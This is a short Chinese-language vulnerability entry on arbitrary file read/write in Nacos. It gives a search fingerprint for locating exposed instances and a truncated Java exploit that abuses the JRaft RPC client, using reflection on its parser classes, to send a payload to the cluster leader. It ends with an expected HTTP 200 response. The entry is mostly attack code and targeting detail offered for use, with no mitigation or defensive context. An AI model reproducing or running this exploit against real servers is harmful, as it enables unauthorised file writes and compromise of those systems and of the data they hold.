# Nacos任意文件读写漏洞

- **系统**：Nacos　|　**类型**：任意文件读取/写入　|　**CVE**：—
- **指纹**：`title="Nacos"`

**请求体 / payload**
```
**任意文件写入**
public static void send(String addr, byte[] payload) throws Exception {
Configuration conf = new Configuration();
conf.parse(addr);
RouteTable.getInstance().updateConfiguration("nacos", conf);
CliClientServiceImpl cliClientService = new CliClientServiceImpl();
cliClientService.init(new CliOptions());
RouteTable.getInstance().refreshLeader(cliClientService, "nacos", 1000).isOk();
PeerId leader = PeerId.parsePeer(addr);
Field parserClasses = cliClientService.getRpcClient().getClass().getDeclaredField("parserClasses");
parserClasses.setAccessible(true);
ConcurrentHashMap map = (Concurr…（脚本共 2928 字，完整版见原文）
```
- **预期**：200　|　—